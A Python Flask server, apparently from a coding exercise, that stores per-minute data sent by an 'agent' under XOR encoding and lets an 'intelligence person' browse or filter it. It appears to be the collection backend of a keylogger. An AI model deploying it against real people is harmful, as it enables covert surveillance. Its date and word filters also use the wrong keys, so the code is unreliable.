from flask import Flask, jsonify, request #!, requests
from flask_cors import CORS
import json
import requests
import os
from Xor_2 import xor_on_key

app = Flask(__name__)
CORS(app)

my_file = r"C:\Users\menachem shoval\Desktop\myTestRepo1\kodcod1\saveData.json"


def filtering_date(from_year, from_month, from_day, to_year, to_month, to_day):
    result = {}
    if not os.path.exists(my_file) or os.stat(my_file).st_size == 0:
            my_dict = [{}]
    else:
        with open(my_file, 'r', encoding='utf-8') as file:
            try:
                my_dict = json.load(file)
            except json.JSONDecodeError:
                my_dict = [{}]

    if my_dict[0]:
        for year in my_dict[0]:
            if int(year) >= int(from_year) and int(year) <= int(to_year):
                for month in my_dict[0][year]:
                    if int(month) >= int(from_month) and int(month) <= int(to_month):
                        for day in my_dict[0][year][month]:
                            if int(day) >= int(from_day) and int(day) <= int(to_day):
                                result[day] = my_dict[0][year][month][day]
    
    return jsonify(result)


@app.route('/save_data', methods=['POST'])
def save_data():
    """
    Get data from agent and save it per a minute in json file
    """
    data = request.get_json()
    print(data)

    if not data:
        return {"status": "empty"}

    if not os.path.exists(my_file) or os.stat(my_file).st_size == 0:
        my_dict = [{}]
    else:
        with open(my_file, 'r', encoding='utf-8') as file:
            try:
                my_dict = json.load(file)
            except json.JSONDecodeError:
                my_dict = [{}]

    for year in data[0]:
        if year in my_dict[0]:
            for month in data[0][year]:
                if month in my_dict[0][year]:
                    for day in data[0][year][month]:
                        if day in my_dict[0][year][month]:
                            for time in data[0][year][month][day]:
                                if time in my_dict[0][year][month][day]:
                                    my_dict[0][year][month][day][time] += xor_on_key(data[0][year][month][day][time], 7)
                                else:
                                    my_dict[0][year][month][day][time] = xor_on_key(data[0][year][month][day][time], 7)
                        else:
                            my_dict[0][year][month][day] = data[0][year][month][day]
                else:
                    my_dict[0][year][month] = data[0][year][month]
        else:
            my_dict[0][year] = data[0][year]

    with open(my_file, 'w', encoding='utf-8') as updated_file:
        json.dump(my_dict, updated_file, ensure_ascii=False)

    print(my_dict)
    return jsonify({"status": True})


@app.route('/', methods=['GET'])
def get_full_data():
    """
    function allows to intelligence person see all the data from the json  file
    """
    if not os.path.exists(my_file) or os.stat(my_file).st_size == 0:
            my_dict = [{}]
    else:
        with open(my_file, 'r', encoding='utf-8') as file:
            try:
                my_dict = json.load(file)
            except json.JSONDecodeError:
                my_dict = [{}]
    return jsonify(my_dict)


@app.route('/filter/date', methods=['POST'])
def filter_by_date():
    """
    function to filter the data by months and/or days.
    the function should recive information in the following format:
    body : { from_year : "2025", from_month : "05", from_day : "18", to_year : "2025", to_month : "08", to_day : "26" }
    """
    date = request.get_json()
    from_year = date.get('from_year')
    from_month = date.get('from_month')
    from_day = date.get('from_day')
    to_year = date.get('year')
    to_month = date.get('month')
    to_day = date.get('day')
    
    return filtering_date(from_year, from_month, from_day, to_year, to_month, to_day)




@app.route('/filter/string', methods=['POST'])
def filter_by_string():
    """
    function to filter the data by specified word.
    the function should recive information in the following format: body : { word : "some_string" } 
    -- without speaces!
    """
    string = request.get_json()
    word = string.get('word')
    result = ''

    if not os.path.exists(my_file) or os.stat(my_file).st_size == 0:
            my_dict = [{}]
    else:
        with open(my_file, 'r', encoding='utf-8') as file:
            try:
                my_dict = json.load(file)
            except json.JSONDecodeError:
                my_dict = [{}]
    if my_dict[0]:
        for year in my_dict[0]:
            for month in my_dict[0][year]:
                for day in my_dict[0][year][month]:
                    for time in my_dict[0][year][month][day]:
                        if word in time:
                            result = my_dict[0][year][month][day]
    
    return jsonify(result)


if __name__ == '__main__':
    app.run(debug=True)
